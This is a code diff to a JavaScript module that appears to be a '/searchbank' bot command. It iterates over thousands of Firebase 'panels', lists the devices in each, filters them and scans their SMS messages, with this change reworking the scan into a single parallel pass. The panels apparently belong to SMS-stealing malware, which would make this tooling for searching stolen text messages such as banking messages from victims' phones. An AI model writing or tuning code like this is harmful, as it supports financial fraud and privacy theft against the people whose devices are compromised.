@@ -11,8 +11,8 @@ const TIERS = {
 };
 
 const SMS_LIMIT = { 1: 550, 3: 900, 7: 1200, 15: 1600, 30: 2000, 0: 2500 };
-const PANEL_PARALLEL = 88;
-const SMS_PARALLEL = 72;
+const PANEL_PARALLEL = 80;
+const DEVICE_SMS_BATCH = 14;
 
 export function parseSearchCommand(text) {
   const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
@@ -196,20 +196,17 @@ export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, e
 }
 
 /**
- * Stream search — har panel batch scan, memory mein saare devices ek saath nahi.
- * 16k+ Firebase complete tak chalti hai (OOM fix).
+ * Single-phase search: har panel = clients → filter → SMS (no global device list).
  */
 export async function runSearch(panels, opts, onProgress) {
   const tier = TIERS[opts.tier] || TIERS.low_high;
   const t0 = Date.now();
   const panelsHit = new Set();
   const results = [];
-  const candidates = [];
   const limit = smsLimitForDays(opts.days);
   let panelsDone = 0;
   let devicesSmsDone = 0;
 
-  // Phase 1 — 16k DB fast (clients only, filter ke hisaab se list)
   await mapPool(panels, PANEL_PARALLEL, async panel => {
     let devices = [];
     try {
@@ -217,32 +214,19 @@ export async function runSearch(panels, opts, onProgress) {
     } catch {
       devices = [];
     }
-    panelsDone++;
     if (devices.length) panelsHit.add(panel.url.toLowerCase());
-    for (const d of devices) {
-      if (devicePassesStatus(d, opts) && devicePassesPin(d, opts)) {
-        candidates.push(d);
-      }
-    }
-    if (panelsDone % 45 === 0 || panelsDone === panels.length) {
-      onProgress?.({
-        phase: 'db',
-        panelsDone,
-        panelsTotal: panels.length,
-        devices: candidates.length,
-        matched: results.length,
-      });
-    }
-  });
 
-  // Phase 2 — SMS (sirf filtered devices)
-  await mapPool(candidates, SMS_PARALLEL, async d => {
-    await scanDeviceSms(d, opts, tier, limit, results);
-    devicesSmsDone++;
-    if (devicesSmsDone % 80 === 0 || devicesSmsDone === candidates.length) {
+    const toScan = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
+    for (let k = 0; k < toScan.length; k += DEVICE_SMS_BATCH) {
+      const chunk = toScan.slice(k, k + DEVICE_SMS_BATCH);
+      await Promise.all(chunk.map(d => scanDeviceSms(d, opts, tier, limit, results)));
+      devicesSmsDone += chunk.length;
+    }
+
+    const done = ++panelsDone;
+    if (done % 40 === 0 || done === panels.length) {
       onProgress?.({
-        phase: 'sms',
-        panelsDone,
+        panelsDone: done,
         panelsTotal: panels.length,
         devices: devicesSmsDone,
         matched: results.length,
